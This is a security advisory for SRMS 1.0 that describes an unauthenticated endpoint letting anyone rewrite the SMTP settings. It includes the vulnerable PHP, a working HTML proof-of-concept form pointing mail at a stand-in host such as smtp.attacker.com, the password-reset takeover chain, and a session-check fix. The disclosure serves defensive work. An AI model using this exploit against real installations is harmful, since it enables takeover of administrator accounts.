# 🚨 SRMS 1.0 - Unauthenticated SMTP Hijacking to Account Takeover

> **Discovered by**: yan1451  
> **Date**: 2026-02-10  
> **Target**: Student Result Management System (SRMS) 1.0  
> **Severity**: Critical (CVSS ~9.1)  

## 🛡️ Vulnerability Overview

**Vulnerability Type**: Broken Access Control / Unauthenticated Configuration Change  
**Affected Component**: `/admin/core/update_smtp.php`  
**Impact**: Account Takeover (ATO), Supply Chain Simulation  

A critical vulnerability exists in the **Student Result Management System (SRMS) 1.0** (by SourceCodester). The file `admin/core/update_smtp.php` fails to verify if a user is logged in or possesses administrative privileges before processing POST requests.

This allows any unauthenticated remote attacker to modify the system's SMTP (Mail Server) configuration. By pointing the SMTP server to an attacker-controlled host, the attacker can intercept "Forgot Password" reset tokens and take full control of the Administrator account.

---

## 🔍 Technical Analysis

### Root Cause
The vulnerability stems from missing session validation in the core logic file. While the file calls `session_start()`, it does not check the `$_SESSION['level']` or any authentication token before executing the database `UPDATE` query.

**Vulnerable Code Snippet (`script/admin/core/update_smtp.php`):**

```php
<?php
chdir('../../');
session_start();
// VULNERABILITY: No check_session.php or role validation here!
require_once('db/config.php');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Attackers can directly POST these values
    $smtp_server = $_POST['mail_server'];
    $smtp_username = $_POST['mail_username'];
    // ...
    $stmt = $conn->prepare("UPDATE tbl_smtp SET server = ? ...");
    $stmt->execute([...]);
}
?>
```

---

## ⚔️ Proof of Concept (Exploit)

### 1. Pre-Attack State (Unauthenticated)
The attacker is currently not logged into the system (on the login page).

> *Figure 1: Attacker is unauthenticated.*
<img width="2553" height="1537" alt="981b6bb8edd74e7461940071e98bdbe8" src="https://github.com/user-attachments/assets/ab55dca4-d167-476a-9955-0adcc928397c" />

### 2. Exploit Execution
The attacker uses a simple HTML form to send a forged POST request to the vulnerable endpoint, changing the mail server to `smtp.attacker.com`.

**Exploit Code (`poc.html`):**

```<!DOCTYPE html>
<html>
<head>
    <title>SRMS SMTP Hijacking PoC</title>
    <style>
        body { font-family: sans-serif; padding: 40px; background: #333; color: white; }
        .exploit-box { border: 2px solid #ff0000; padding: 20px; background: #000; }
        h2 { color: #ff0000; }
        input[type=text] { width: 100%; padding: 10px; margin: 5px 0; }
        input[type=submit] { background: #ff0000; color: white; padding: 15px; border: none; cursor: pointer; font-weight: bold; font-size: 16px; }
    </style>
</head>
<body>
    <div class="exploit-box">
        <h2>SMTP Configuration Hijack Exploit</h2>
        <p>Target: /admin/core/update_smtp.php (Unauthenticated)</p>
        
        <form action="http://localhost/srms/script/admin/core/update_smtp.php" method="POST">
            
            <label>Mail Server (Hijacked):</label>
            <input type="text" name="mail_server" value="smtp.attacker.com">
            
            <label>Username (Hijacked):</label>
            <input type="text" name="mail_username" value="hacker@evil.com">
            
            <label>Password:</label>
            <input type="text" name="mail_password" value="pwned123">
            
            <label>Port:</label>
            <input type="text" name="mail_port" value="6666">
            
            <label>Security:</label>
            <input type="text" name="mail_security" value="none">
            
            <br><br>
            <input type="submit" value=">>> EXECUTE ATTACK (执行劫持) <<<">
        </form>
    </div>
</body>
</html>
```

### 3. Post-Attack Verification
After executing the script, the system configuration is immediately altered.

> *Figure 2: SMTP settings successfully tampered by the attacker.*
<img width="2541" height="1516" alt="335799a1e7704e26f77fba0dcdae8852" src="https://github.com/user-attachments/assets/da4dc144-36ac-4338-9566-d9fc5f785e49" />

---

## 💥 The Attack Chain (Impact Scenario)

This vulnerability leads to a full **Account Takeover (ATO)** via the following chain:

1.  **Hijack**: Attacker changes the system's SMTP server to a malicious server they control.
2.  **Trigger**: Attacker goes to the Login Page and clicks **"Forgot Password"**.
3.  **Intercept**: The system sends the "Password Reset Link" using the attacker's SMTP configuration. The email lands in the attacker's inbox (or logs), not the real admin's email.
4.  **Takeover**: Attacker clicks the reset link and sets a new password for the Administrator.

---

## 🛠️ Remediation / Fix

To fix this vulnerability, strictly enforce session checks at the beginning of `update_smtp.php`.

**Patched Code:**

```php
session_start();

// ADD THIS CHECK
if (!isset($_SESSION['level']) || $_SESSION['level'] != '0') {
    header("location: ../../");
    exit();
}

require_once('db/config.php');
// ... rest of the code
```

---

## ⚠️ Disclaimer
*This report is for educational purposes only. The author is not responsible for any misuse of this information. Testing was conducted in a local, controlled environment.*
